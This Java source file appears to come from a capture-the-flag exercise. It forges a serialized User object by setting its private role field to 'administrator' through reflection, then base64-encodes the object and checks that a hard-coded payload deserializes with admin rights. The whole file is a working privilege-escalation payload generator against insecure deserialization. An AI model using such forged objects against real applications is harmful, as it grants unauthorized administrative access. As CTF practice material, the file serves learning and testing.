import com.xsctf.ldar.Bean.User;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;


public class Learn_payload {

    public static void main(String[] args) throws Exception{
        User user = new User();
        Field field = User.class.getDeclaredField("role");
        field.setAccessible(true);
        field.set(user,"administrator");
        serialize(user);
        System.out.println(base64encode(Files.readAllBytes(Paths.get("ser.bin"))));
        byte[] decodedBytes = Base64.getDecoder().decode("rO0ABXNyACZjb20ueHNjdGYubGRhci5CZWFuLkxlYXJuX3BheWxvYWQkVXNlcggMZJDS3MwaAgADTAAFZW1haWx0ABJMamF2YS9sYW5nL1N0cmluZztMAARyb2xlcQB+AAFMAAh1c2VybmFtZXEAfgABeHBwdAANYWRtaW5pc3RyYXRvcnA=");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decodedBytes));
        user = (User)ois.readObject();
        System.out.println("administrator".equals(user.getRole()));
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static String base64encode(byte[] bytes) throws Exception
    {
        Class<?> base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder").invoke(null);
        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
    }
}